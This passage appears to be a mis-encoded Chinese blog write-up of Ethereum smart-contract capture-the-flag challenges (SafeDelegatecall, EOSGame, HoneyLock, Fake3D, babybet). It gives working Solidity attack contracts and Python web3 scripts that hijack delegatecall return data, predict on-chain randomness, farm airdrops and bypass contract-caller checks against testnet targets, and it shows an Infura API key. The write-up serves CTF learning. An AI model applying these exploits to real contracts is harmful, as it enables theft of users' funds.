æ­¤æˆ‘ä»¬å¯ä»¥å°†lancherä¿®æ”¹æˆæ”»å‡»åˆçº¦ï¼Œå†åœ¨æ”»å‡»åˆçº¦ä¸­ç¼–å†™å‡½æ•°ä¿®æ”¹slot2ä¸­çš„å˜é‡ä¸ºfalseå°±å¯ä»¥äº†\nè°ƒç”¨setCountDownTimerè¦ç»•è¿‡ä¸¤ä¸ªé™åˆ¶ï¼Œå…¶ä¸­çš„notExplodeYetå¥½è¯´ï¼Œåœ¨åˆçº¦éƒ¨ç½²åŽçš„100ä¸ªåŒºå—å†…éƒ½å¯ä»¥ç»•è¿‡è¯¥æ£€æµ‹ï¼Œä½†æ˜¯ç¬¬ä¸€æ¬¡delegatecallæ‰§è¡Œä¹‹åŽâ€œlauncherâ€åˆçº¦ä¸­çš„slot0å˜é‡ä½œä¸ºdeadlineï¼Œå¦‚æžœä¸åˆå§‹åŒ–åˆ™ä¸º0ï¼Œåˆ™æ”»å‡»å¤±è´¥\nå¦ä¸€ä¸ªæ£€æµ‹å°±æ˜¯isOwnerï¼Œå…¶ä¸­åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼Œé¦–å…ˆåˆ†æžcallerçš„sizeä¸º0â€“å¯¹åº”è§£å†³æ–¹æ³•å°±æ˜¯constructorå‡½æ•°ï¼Œå…¶æ¬¡sender!&#x3D;originï¼Œè¿˜æ˜¯ä½¿ç”¨åˆçº¦åšagent\næœ€åŽä¹Ÿå°±æ˜¯msgPassword() &#x3D;&#x3D; passwordï¼Œç®€å•å†™ä¸€ä¸ªè„šæœ¬å¾—åˆ°fakeflagä¹Ÿå°±æ˜¯passwordä¸º\n0x000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d\nå³flag&#123;donLetUrDreamBeDream&#125;\n\nç»•è¿‡è¯¥åˆ¤æ–­æ¡ä»¶éœ€è¦ä½¿calldataçš„ç¬¬68ä½ä¹‹åŽçš„32ä½bytesç­‰äºŽfakeflagï¼ˆä¸å«selector&#x3D;&#x3D;4ä½bytesï¼‰ï¼Œè€Œcalldataæœ€åŽçš„å‚æ•°åˆšå¥½æ˜¯64+8+64&#x3D;136ï¼ˆ0x44byteä¹‹åŽï¼‰\nç»¼ä¸Šå³å¯ç»•è¿‡æ‰€æœ‰æ£€æµ‹\nAttackcontract attack&#123;\n    uint256 public deadline;\n    constructor(address tar)public&#123;\n        address target=tar;\n        bytes32 data0=0x000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d;\n        address helperaddr=address(new helper());\n        bytes memory data=abi.encodeWithSignature(\"setCountDownTimer(uint256)\",uint(uint168(uint160(helperaddr))&lt;&lt;8),data0);\n        bytes memory data1=abi.encodeWithSignature(\"setCountDownTimer(uint256)\",0,data0);\n        tar.call(data);\n        tar.call(data1);\n    &#125;\n&#125;\n\ncontract helper&#123;\n    uint256 public deadline=block.number + 100;\n    bytes32 private password;\n    bool public power_state = true;\n    function setdeadline(uint256 _deadline) public &#123;\n        power_state = _deadline!=0;\n    &#125;\n&#125;\n\nSafeDelegatecall\n\n\n\n\n\n\n\n\nCan delegatecall be safe?\nCodepragma solidity ^0.4.23;\n\ncontract SafeDelegatecall &#123;\n\n    address private owner;\n    bytes4 internal constant SET = bytes4(keccak256('fifth(uint256)'));\n    event SendFlag(address addr);\n    uint randomNumber = 0;\n\n    struct Func &#123;\n        function() internal f;\n    &#125;\n\n    constructor() public payable &#123;\n        owner = msg.sender;\n    &#125;\n\n    modifier onlyOwner &#123;\n        require(msg.sender == owner);\n        _;\n    &#125;\n\n    function execute(address _target) public payable&#123;\n        require(_target.delegatecall(abi.encodeWithSelector(this.execute.selector)) == false, 'unsafe execution');\n\n        bytes4 sel;\n        uint val;\n\n        (sel, val) = getRet();\n        require(sel == SET);\n\n        Func memory func;\n        func.f = gift;\n        assembly &#123;\n            mstore(func, sub(mload(func), val))\n        &#125;\n        func.f();\n    &#125;\n\n    function gift() private &#123;\n        payforflag();\n    &#125;\n\n    function getRet() internal pure returns (bytes4 sel, uint val) &#123;\n        assembly &#123;\n            if iszero(eq(returndatasize, 0x24)) &#123; revert(0, 0) &#125;\n            let ptr := mload(0x40)\n            returndatacopy(ptr, 0, 0x24)\n            sel := and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000)\n            val := mload(add(0x04, ptr))\n        &#125;\n    &#125;\n\n    function payforflag() public payable onlyOwner &#123;\n        require(msg.value == 1, 'I only need a little money!');\n        emit SendFlag(msg.sender);\n        selfdestruct(msg.sender);\n    &#125;\n\n    function() payable public&#123;&#125;\n&#125;\n\nAnalayseç”±äºŽexecuteå‡½æ•°å¢žåŠ äº†requireï¼Œæœ‰æ•ˆé˜²æ­¢äº†delegatecallå¯¹äºŽåˆçº¦storageå˜é‡çš„ä¿®æ”¹ï¼Œä½†æ˜¯ä¸‹æ–¹çš„memoryå˜é‡çš„æ”¹å˜å–å†³äºŽreturndataï¼Œè€Œreturndataå¯æŽ§â€”-revert(s,t)ï¼ŒæŽ§åˆ¶returndatasizeä¸º0x24ï¼Œå‰bytes4ä¸ºå…¨å±€å˜é‡SETå³å¯ä¿è¯ç¬¬äºŒæ¬¡requireä¸ä¼šå‡ºé”™\nä½†æ˜¯æ­¤å¤„æœ‰ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„å˜é‡valï¼Œè¿™ä¸ªå˜é‡çš„å€¼ä¸ºreturndataçš„åŽ32ä¸ªbyteï¼Œè€Œè¿™ä¸ªåªæ˜¯å¯æŽ§çš„ï¼Œæ‰€ä»¥ä¹Ÿå°±æ˜¯è¯´sub(mload(func), val)è¿™ä¸ªå€¼å¯æŽ§åˆ¶ï¼Œè€Œè¿™ä¸ªå€¼åˆè¢«memory storeï¼Œé‡æ–°èµ‹å€¼äº†fun.fï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰§è¡Œåˆ°æ­¤çš„æ—¶å€™func.få¯ä»¥è¢«èµ‹å€¼ä¸ºä»»ä½•æˆ‘ä»¬æƒ³è¦çš„å€¼ï¼Œä¹Ÿå°±å½¢æˆäº†ä»»æ„è·³è½¬ï¼Œå³å¯ç»•è¿‡ä¸€åˆ‡é™åˆ¶æ¡ä»¶\nåˆ†æžåˆ°è¿™é‡Œé¢˜ç›®çš„æ€è·¯å·²ç»å¾ˆæ¸…æ™°äº†ï¼šâ‘ å¾—åˆ°ä»»æ„è·³è½¬åˆ°çš„ç›®æ ‡åœ°å€â‘¡è®¡ç®—mload(func)çš„å€¼æ˜¯å¤šå°‘â‘¢ç¼–å†™æ”»å‡»åˆçº¦ï¼Œè¿”å›žæœŸæœ›çš„returndataâ€”â€“å…¨éƒ¨çš„memoryå˜é‡\nåç¼–è¯‘ä¸€ä¸‹ï¼Œå› ä¸ºåˆçº¦ä¸­ä»…æœ‰ä¸€ä¸ªå‡½æ•°åˆ¤æ–­äº†msg.valueæ˜¯å¦ä¸º1ï¼Œæ‰€ä»¥æœ¬æ®µä»£ç æ¯”è¾ƒå¥½å¯¹åº”ï¼Œä¹Ÿå°±æ˜¯payforflagå‡½æ•°ä¸­ï¼Œå¯¹åº”ä¸ºä¸‹å›¾\n\nå¯è§å¦‚æžœmsg.valueç¡®å®žä¸º1çš„è¯å°†ä¼šè·³è½¬åˆ°0x3c1ï¼Œæ‰€ä»¥å¯ä»¥ç¡®å®šï¼Œä»»æ„è·³è½¬åˆ°0x3c1åœ°å€ï¼Œå³å¯ç»•è¿‡\nonlyOwnerä»¥åŠ require(msg.value == 1, &#39;I only need a little money!&#39;) çš„é™åˆ¶æ¡ä»¶ç›´æŽ¥&#96;emit sendFlag\nç»“åˆremixç¼–è¯‘å™¨åç¼–è¯‘å‡ºçš„opcodeå¯¹åº”çº¿ä¸‹åç¼–è¯‘çš„ç»“æžœï¼Œå®šä½åˆ°mload(func)è¿›è€Œä¸Šæº¯è‡³push giftä¸€æ­¥æ“ä½œï¼Œå¾—åˆ°giftå‡½æ•°å¯¹åº”destinationä¸º0x48a\n\n\nç»¼ä¸Šæ‰€è¿°ï¼Œå·²ç»å¯ä»¥æž„é€ æ”»å‡»åˆçº¦è¿›è¡Œæ”»å‡»\nAttackcontract attack &#123;\n    bytes4 constant SEL = bytes4(keccak256('fifth(uint256)'));\n    function execute(address balabala) public&#123;\n        bytes4 sel = SEL;\n        assembly &#123;\n            mstore(0,sel)\n            mstore(0x4,sub(0x0362,0x2e4))//sub(0x48a,0x3c1)\n            revert(0,0x24)\n        &#125;\n    &#125;\n&#125;\n\nåœ¨æ­¤å‘çŽ°äº†å¾ˆæœ‰æ„æ€çš„ä¸€ç‚¹ï¼Œè¿›è¡Œéƒ¨ç½²æ—¶çš„ä»£ç å’Œé¢˜ç›®ç»™å‡ºçš„ä»£ç å¹¶ä¸ç›¸åŒï¼ŒäºŽæ˜¯é‡æ–°åˆ†æžä¸€ä¸‹æ˜¯å¦‚ä¸‹ç»“æžœï¼Œæ‰€ä»¥ä»£ç æ¡†ä¸­çš„æ³¨é‡Šéƒ¨åˆ†ä¸ºé¢˜ç›®ä»£ç çš„æ•°å€¼ï¼Œæœªæ³¨é‡Šéƒ¨åˆ†ä¸ºå®žé™…éƒ¨ç½²æ—¶å¯¹åº”çš„æ•°å€¼\n\nbad randomness\n\n\n\n\n\n\n\n\nHave you ever played eos.win? Itâ€™s quite easy to get eos tokens here! Submite the base64 code of your email address to the CaptureTheFlag(string b64email) fucntion when you have enough EOS. This contract is at 0x804d8B0f43C57b5Ba940c1d1132d03f1da83631F in Ropsten network.\nEOSGame\n\npragma solidity ^0.4.24;\n\nlibrary SafeMath &#123;\n\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n    if (a == 0) &#123;\n      return 0;\n    &#125;\n\n    uint256 c = a * b;\n    require(c / a == b);\n\n    return c;\n  &#125;\n\n  function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n    require(b > 0); // Solidity only automatically asserts when dividing by 0\n    uint256 c = a / b;\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n    return c;\n  &#125;\n\n  /**\n  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).\n  */\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n    require(b &lt;= a);\n    uint256 c = a - b;\n\n    return c;\n  &#125;\n\n  /**\n  * @dev Adds two numbers, reverts on overflow.\n  */\n  function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n    uint256 c = a + b;\n    require(c >= a);\n\n    return c;\n  &#125;\n\n  /**\n  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),\n  * reverts when dividing by zero.\n  */\n  function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n    require(b != 0);\n    return a % b;\n  &#125;\n&#125;\n\ncontract EOSToken&#123;\n    using SafeMath for uint256;\n    string TokenName = \"EOS\";\n    \n    uint256 totalSupply = 100**18;\n    address owner;\n    mapping(address => uint256)  balances;\n    \n    modifier onlyOwner() &#123;\n        require(msg.sender == owner);\n        _;\n    &#125;\n    \n    constructor() public&#123;\n        owner = msg.sender;\n        balances[owner] = totalSupply;\n    &#125;\n    \n    function mint(address _to,uint256 _amount) public onlyOwner &#123;\n        require(_amount &lt; totalSupply);\n        totalSupply = totalSupply.sub(_amount);\n        balances[_to] = balances[_to].add(_amount);\n    &#125;\n    \n    function transfer(address _from, address _to, uint256 _amount) public onlyOwner &#123;\n        require(_amount &lt; balances[_from]);\n        balances[_from] = balances[_from].sub(_amount);\n        balances[_to] = balances[_to].add(_amount);\n    &#125;\n    \n    function eosOf(address _who) public constant returns(uint256)&#123;\n        return balances[_who];\n    &#125;\n&#125;\n\n\ncontract EOSGame&#123;\n    \n    using SafeMath for uint256;\n    mapping(address => uint256) public bet_count;\n    uint256 FUND = 100;\n    uint256 MOD_NUM = 20;\n    uint256 POWER = 100;\n    uint256 SMALL_CHIP = 1;\n    uint256 BIG_CHIP = 20;\n    EOSToken  eos;\n    \n    event FLAG(string b64email, string slogan);\n    \n    constructor() public&#123;\n        eos=new EOSToken();\n    &#125;\n    \n    function initFund() public&#123;\n        if(bet_count[tx.origin] == 0)&#123;\n            bet_count[tx.origin] = 1;\n            eos.mint(tx.origin, FUND);\n        &#125;\n    &#125;\n    \n    function bet(uint256 chip) internal &#123;\n        bet_count[tx.origin] = bet_count[tx.origin].add(1);\n        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));\n        uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));\n        uint256 shark = seed_hash % MOD_NUM;\n        uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_count[tx.origin])));\n        uint256 lucky = lucky_hash % MOD_NUM;\n        if (shark == lucky)&#123;\n            eos.transfer(address(this), tx.origin, chip.mul(POWER));\n        &#125;\n    &#125;\n    \n    function smallBlind() public &#123;\n        eos.transfer(tx.origin, address(this), SMALL_CHIP);\n        bet(SMALL_CHIP);\n    &#125;\n    \n    function bigBlind() public &#123;\n        eos.transfer(tx.origin, address(this), BIG_CHIP);\n        bet(BIG_CHIP);\n    &#125;\n    \n    function eosBlanceOf() public view returns(uint256) &#123;\n        return eos.eosOf(tx.origin);\n    &#125;\n\n    function CaptureTheFlag(string b64email) public&#123;\n\t\trequire (eos.eosOf(tx.origin) > 18888);\n\t\temit FLAG(b64email, \"Congratulations to capture the flag!\");\n\t&#125;\n&#125;\n\nAnalyseåˆçº¦é‡Œè¾¹æŸ¥è¯¢ä½™é¢æ‰€ç”¨çš„å‚æ•°ä¸ºtx.originï¼Œæç¤ºçš„å¤ªæ˜Žæ˜¾äº†ï¼Œå†åŠ ä¹‹betä¸­ä½¿ç”¨çš„éƒ½æ˜¯åŒºå—é“¾çš„å…¨å±€å˜é‡ï¼Œå†™ä¸ªåˆçº¦è¿›è¡Œpredictå³å¯\nAttackä¸€éä¸€éçš„å¤ªçƒ¦äº†ï¼Œå†™ä¸ªè„šæœ¬æžä¸€ä¸‹å§\ncontract attack&#123;\n    mapping(address => uint256) public bet_count;\n    EOSGame tar;\n    uint256 MOD_NUM = 20;\n    uint public a;\n    uint public b;\n    constructor()&#123;\n        bet_count[tx.origin]+=1;\n        tar=EOSGame(0x804d8B0f43C57b5Ba940c1d1132d03f1da83631F);\n        tar.initFund();\n    &#125;\n\n    function pwn()public&#123;\n        (a,b)=core();\n    &#125;\n\n    function core()internal returns(uint sharknum,uint luckynum) &#123;\n        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));\n        uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));\n        uint256 shark = seed_hash % MOD_NUM;\n        uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_count[tx.origin])));\n        uint256 lucky = lucky_hash % MOD_NUM;\n        if (shark == lucky)&#123;\n            bet_count[tx.origin] = bet_count[tx.origin]+1;\n            tar.bigBlind();\n        &#125;\n        return(shark,lucky);\n    &#125;\n    function shark() public view returns(uint sharnum)&#123;\n        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));\n        uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));\n        uint256 shark = seed_hash % MOD_NUM;\n        return shark;\n    &#125;\n\n\nfrom base64 import b16decode\nfrom web3 import Web3,HTTPProvider\nimport time\nw3=Web3(HTTPProvider('https://ropsten.infura.io/v3/18a393d792ae461489aa663d5d1b3fdf'))\n\nabi=[attack abi]\nabi1=[token abi]\n\neosadd='token address'\nconaddress='attack address'\n\neostoken=w3.eth.contract(abi=abi1,address=eosadd)\nswap=w3.eth.contract(abi=abi,address=conaddress)\nacct=w3.eth.account.from_key('privatekey')\n\n\nfor i in range(0,0xfffffffffffffffffffffffff):\n\t\tparams = swap.functions.pwn().buildTransaction(&#123;\n\t\t\t'nonce':w3.eth.getTransactionCount(acct.address),\n\t\t\t'gas':3000000,\n\t\t\t'gasPrice':w3.eth.gasPrice\n\t\t&#125;)\n\t\tprint(w3.eth.sendRawTransaction(acct.signTransaction(params).rawTransaction).hex())\n\n\t\ttime.sleep(40)\n\t\tb1=eostoken.functions.eosOf(acct.address).call()\n\t\tprint(b1,b1>18888)\n\t\tif b1>18888:\n\t\t\tbreak\n\nå†™ä¸ªè„šæœ¬ï¼Œæœ‰ç‚¹è´¹é’±ï¼Œè¿˜å¾—æ‹¼è¿æ°”ðŸ˜‚\nairdrop huntingCoinFlip\n\n\n\n\n\n\n\n\n\nHoneyLock\naddress :0xF60ADeF7812214eBC746309ccb590A5dBd70fc21 on ropsten.\ncall CaptureTheFlag with base64(your email),you will receive flag.\n\nCodepragma solidity ^0.4.24;\n\ncontract P_Bank\n&#123;\n    mapping (address => uint) public balances;\n    \n    uint public MinDeposit = 0.1 ether;\n    \n    Log TransferLog;\n\n    event FLAG(string b64email, string slogan);\n    \n\n\n    constructor(address _log) public &#123; \n        TransferLog = Log(_log);\n     &#125;\n\n    function Ap() public &#123;\n        if(balances[msg.sender] == 0) &#123;\n            balances[msg.sender]+=1 ether;\n        &#125;\n    &#125;\n\n    function Transfer(address to, uint val) public &#123;\n        if(val > balances[msg.sender]) &#123;\n            revert();\n        &#125;\n        balances[to]+=val;\n        balances[msg.sender]-=val;\n    &#125;\n\n    function CaptureTheFlag(string b64email) public returns(bool)&#123;\n      require (balances[msg.sender] > 500 ether);\n      emit FLAG(b64email, \"Congratulations to capture the flag!\");\n    &#125;\n\n    \n    function Deposit()\n    public\n    payable\n    &#123;\n        if(msg.value > MinDeposit)\n        &#123;\n            balances[msg.sender]+= msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        &#125;\n    &#125;\n    \n    function CashOut(uint _am) public \n    &#123;\n        if(_am&lt;=balances[msg.sender])\n        &#123;\n            \n            if(msg.sender.call.value(_am)())\n            &#123;\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            &#125;\n        &#125;\n    &#125;\n    \n    function() public payable&#123;&#125;    \n    \n&#125;\n\ncontract Log \n&#123;\n   \n    struct Message\n    &#123;\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    &#125;\n    \n    string err = \"CashOut\";\n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    &#123;\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    &#125;\n&#125;\n\nAnalyseapå‡½æ•°ï¼Œtransferå‡½æ•°å¾ªçŽ¯è°ƒç”¨å°±å¥½äº†\nAttackcontract attack&#123;\n    P_Bank target;\n    constructor(address tar)public&#123;\n        target=P_Bank(tar);\n    &#125;\n    function pwn()public &#123;\n        for(uint i=0;i&lt;500;i++)&#123;\n            target.Ap();\n            target.Transfer(tx.origin,1 ether);\n        &#125;\n    &#125;\n&#125;\n\nFake3d\n\n\n\n\n\n\n\n\nWelcome to fake3D game! There are airdrops for you, but you have to pass the turning test first! Flag is cheaper here, and also sent to your email. This game is at 0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a in Ropsten network.\nCode/**\n *Submitted for verification at Etherscan.io on 2018-11-27\n*/\n\npragma solidity ^0.4.24;\n\n/**\n * @title SafeMath\n * @dev Math operations with safety checks that revert on error\n */\nlibrary SafeMath &#123;\n\n  /**\n  * @dev Multiplies two numbers, reverts on overflow.\n  */\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n    // benefit is lost if 'b' is also tested.\n    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522\n    if (a == 0) &#123;\n      return 0;\n    &#125;\n\n    uint256 c = a * b;\n    require(c / a == b);\n\n    return c;\n  &#125;\n\n  /**\n  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.\n  */\n  function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n    require(b > 0); // Solidity only automatically asserts when dividing by 0\n    uint256 c = a / b;\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n    return c;\n  &#125;\n\n  /**\n  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).\n  */\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n    require(b &lt;= a);\n    uint256 c = a - b;\n\n    return c;\n  &#125;\n\n  /**\n  * @dev Adds two numbers, reverts on overflow.\n  */\n  function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n    uint256 c = a + b;\n    require(c >= a);\n\n    return c;\n  &#125;\n\n  /**\n  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),\n  * reverts when dividing by zero.\n  */\n  function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n    require(b != 0);\n    return a % b;\n  &#125;\n&#125;\n\ncontract WinnerList&#123;\n    address owner;\n    struct Richman&#123;\n        address who;\n        uint balance;\n    &#125;\n    \n    function note(address _addr, uint _value) public&#123;\n        Richman rm;\n        rm.who = _addr;\n        rm.balance = _value;\n    &#125;\n    \n&#125;\n\ncontract Fake3D &#123;\n    using SafeMath for *;\n\tmapping(address => uint256)  public balance;\n\tuint public totalSupply  = 10**18;\n\tWinnerList wlist;\n\t\n\tevent FLAG(string b64email, string slogan);\n\t\n\tconstructor(address _addr) public&#123;\n\t    wlist = WinnerList(_addr);\n\t&#125;\n\n\tmodifier turingTest() &#123;\n\t        address _addr = msg.sender;\n\t        uint256 _codeLength;\n\t        assembly &#123;_codeLength := extcodesize(_addr)&#125;\n\t        require(_codeLength == 0, \"sorry humans only\");\n\t        _;\n\t&#125;\n    \n    function transfer(address _to, uint256 _amount) public&#123;\n        require(balance[msg.sender] >= _amount);\n        balance[msg.sender] = balance[msg.sender].sub(_amount);\n        balance[_to] = balance[_to].add(_amount);\n    &#125;\n\n\n\tfunction airDrop() public turingTest returns (bool) &#123;\n\t\tuint256 seed = uint256(keccak256(abi.encodePacked(\n            (block.timestamp).add\n            (block.difficulty).add\n            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n            (block.gaslimit).add\n            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\n            (block.number)\n        )));\n\n        if((seed - ((seed / 1000) * 1000)) &lt; 288)&#123;\n            balance[tx.origin] = balance[tx.origin].add(10);\n\t\t\ttotalSupply = totalSupply.sub(10);\n\t\t\treturn true;\n\t\t&#125;\n        else\n\t\t\treturn false;\n\t&#125;\n\t\n   function CaptureTheFlag(string b64email) public&#123;\n\t\trequire (balance[msg.sender] > 8888);\n\t\twlist.note(msg.sender,balance[msg.sender]);\n\t\temit FLAG(b64email, \"Congratulations to capture the flag?\");\n\t&#125;\n\n&#125;\n\nAnalyseè–…ç¾Šæ¯›ï¼Œè–…å°±è¡Œäº†ï¼Œgasè°ƒåˆ°0.075ethï¼Œpwn(600)\nAttackcontract attack&#123;\n    using SafeMath for *;\n    uint256 public flag;\n    function pwn(uint times) public returns(uint)&#123;\n            for(uint i=0;i&lt;times;i++)&#123;\n                new helper();\n            &#125;\n    &#125;\n&#125;\n\ncontract helper&#123;\n    constructor() public&#123;\n        Fake3D target=Fake3D(0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a);\n        target.airDrop();\n    &#125;\n&#125;\n\n\nåˆå‘ç”Ÿäº†ä¸€ä»¶æœ‰æ„æ€çš„äº‹æƒ…ï¼ŒCapturetheflagæ—¶å€™æŠ¥é”™ï¼Œçœ‹æ¥åˆæ˜¯æ‰€ç»™ä»£ç å’Œå®žé™…ä»£ç ä¸æ˜¯ä¸€å¥—\nçœ‹ä¸€ä¸‹å®žé™…åˆçº¦åˆå‘çŽ°æºç ä¸å¼€æºðŸ˜«\nåç¼–è¯‘ä¸€ä¸‹\ncontract Contract &#123;\n    function main() &#123;\n        memory[0x40:0x60] = 0x80;\n    \n        if (msg.data.length &lt; 0x04) &#123; revert(memory[0x00:0x00]); &#125;\n    \n        var var0 = msg.data[0x00:0x20] / 0x0100000000000000000000000000000000000000000000000000000000 &amp; 0xffffffff;\n    \n        if (var0 != 0x03b6eb88) &#123; revert(memory[0x00:0x00]); &#125;\n    \n        var var1 = msg.value;\n    \n        if (var1) &#123; revert(memory[0x00:0x00]); &#125;\n    \n        var1 = 0x0091;\n        var var2 = msg.data[0x04:0x24] &amp; 0xffffffffffffffffffffffffffffffffffffffff;\n        var var3 = msg.data[0x24:0x44];\n        func_0093(var2, var3);\n        stop();\n    &#125;\n    \n    function func_0093(var arg0, var arg1) &#123;\n        var var0 = 0x00;\n        storage[var0] = (arg0 &amp; 0xffffffffffffffffffffffffffffffffffffffff) | (storage[var0] &amp; ~0xffffffffffffffffffffffffffffffffffffffff);\n        storage[var0 + 0x01] = arg1;\n        var var1 = ~0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff &amp; 0x0100000000000000000000000000000000000000000000000000000000000000 * 0xb1;\n        var var2 = tx.origin * 0x01000000000000000000000000;\n        var var3 = 0x12;\n    \n        if (var3 >= 0x14) &#123; assert(); &#125;\n    \n        var temp0 = byte(var2, var3) * 0x0100000000000000000000000000000000000000000000000000000000000000 &amp; ~0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff != var1;\n        var1 = temp0;\n    \n        if (!var1) &#123;\n        label_023F:\n        \n            if (!var1) &#123; return; &#125;\n            else &#123; revert(memory[0x00:0x00]); &#125;\n        &#125; else &#123;\n            var1 = ~0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff &amp; 0x0100000000000000000000000000000000000000000000000000000000000000 * 0x43;\n            var2 = tx.origin * 0x01000000000000000000000000;\n            var3 = 0x13;\n        \n            if (var3 >= 0x14) &#123; assert(); &#125;\n        \n            var1 = byte(var2, var3) * 0x0100000000000000000000000000000000000000000000000000000000000000 &amp; ~0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff != var1;\n            goto label_023F;\n        &#125;\n    &#125;\n&#125;\n\nå‘çŽ°äº†revertå’Œassertï¼Œç€é‡åˆ†æžä¸€ä¸‹\næ ¹æ®é€»è¾‘è®¡ç®—å‘çŽ°å°±æ˜¯åˆ¤æ–­tx.originçš„å€’æ•°ä¸‰å››ä½çš„å€¼æ˜¯å¦ç­‰äºŽ0xb1\nå€’æ•°ä¸€äºŒä½çš„å€¼æ˜¯å¦ç­‰äºŽ0x43\nå†™ä¸ªè„šæœ¬è·‘ä¸€ä¸ªå‡ºæ¥å°±å¥½äº†\ndef generate_random_str(randomlength=16):\n    string.digits='0123456789'\n    string.ascii_letters='abcdef'\n    str_list = [random.choice(string.digits + string.ascii_letters) for i in range(randomlength)]\n    random_str = ''.join(str_list)\n    return random_str\nfor i in range(0,0xffffff):\n     a=generate_random_str(64)\n     address=blocksmith.EthereumWallet.generate_address(a)\n     print(address[40:42],address[39:41])\n     if(address[40:42]=='43')or(address[38:40]=='b1'):\n            print(a,address)\n            break\n\n\nå¯¼å…¥metamaskï¼Œè°ƒç”¨å‡½æ•°ï¼Œå³å¯\nbabybetCode0x6080604052600436106100775763ffffffff7c0100000000000000000000000000000000000000000000000000000000600035041663645b8b1b811461009857806366d16cc3146100d85780637365870b146100ef5780638c0320de14610107578063e3d670d71461019e578063f0d25268146101cc575b3360009081526020819052604090208054670de0b6b3a76400003404019055005b3480156100a457600080fd5b506100c673ffffffffffffffffffffffffffffffffffffffff600435166101fd565b60408051918252519081900360200190f35b3480156100e457600080fd5b506100ed61020f565b005b3480156100fb57600080fd5b506100ed60043561024c565b34801561011357600080fd5b506040805160206004803580820135601f81018490048402850184019095528484526100ed94369492936024939284019190819084018382808284375050604080516020601f89358b018035918201839004830284018301909452808352979a9998810197919650918201945092508291508401838280828437509497506102e29650505050505050565b3480156101aa57600080fd5b506100c673ffffffffffffffffffffffffffffffffffffffff6004351661047d565b3480156101d857600080fd5b506100ed73ffffffffffffffffffffffffffffffffffffffff6004351660243561048f565b60016020526000908152604090205481565b336000908152600160205260409020541561022957600080fd5b336000908152602081815260408083208054600a01905560019182905290912055565b336000908152602081905260408120548190600a111561026b57600080fd5b3360009081526001602052604090205460021161028757600080fd5b5050336000908152602081905260409020805460091901905543600019014060038106828114156102ca5733600090815260208190526040902080546103e80190555b50503360009081526001602052604090206002905550565b33600090815260208190526040902054620f4240111561030157600080fd5b60025473ffffffffffffffffffffffffffffffffffffffff16331461033157336000908152602081905260408120555b60025460405173ffffffffffffffffffffffffffffffffffffffff90911690303180156108fc02916000818181858888f19350505050158015610378573d6000803e3d6000fd5b507f6335b7f9c4dff99c3a870eaf18b802774df3aba4e21b72549f3a03b6bc974c908282604051808060200180602001838103835285818151815260200191508051906020019080838360005b838110156103dd5781810151838201526020016103c5565b50505050905090810190601f16801561040a5780820380516001836020036101000a031916815260200191505b50838103825284518152845160209182019186019080838360005b8381101561043d578181015183820152602001610425565b50505050905090810190601f16801561046a5780820380516001836020036101000a031916815260200191505b5094505050505060405180910390a15050565b60006020819052908152604090205481565b336000908152602081905260409020548111156104ab57600080fd5b336000908152602081905260408082208054849003905573ffffffffffffffffffffffffffffffffffffffff93909316815291909120805490910190555600a165627a7a723058207958bdc84ae120b218d0987fdff009a5dbca73d76271563852fd4b0550efa3790029\n\nAnalyseæ²¡å¼€æºçš„åˆçº¦ï¼Œæ¶‰åŠåˆ°äº†è½¯è‚‹\nåç¼–è¯‘ä¸€ä¸‹å¾—åˆ°å…³é”®å‡½æ•°\n\né€ä¸€åˆ†æžå³å¯ï¼Œæ¯”è¾ƒç®€å•ï¼Œä¸»è¦åœ¨äºŽpayforflagå‡½æ•°ï¼Œpayforflagå‡½æ•°ä¼šè¿›è¡Œä¸€æ¬¡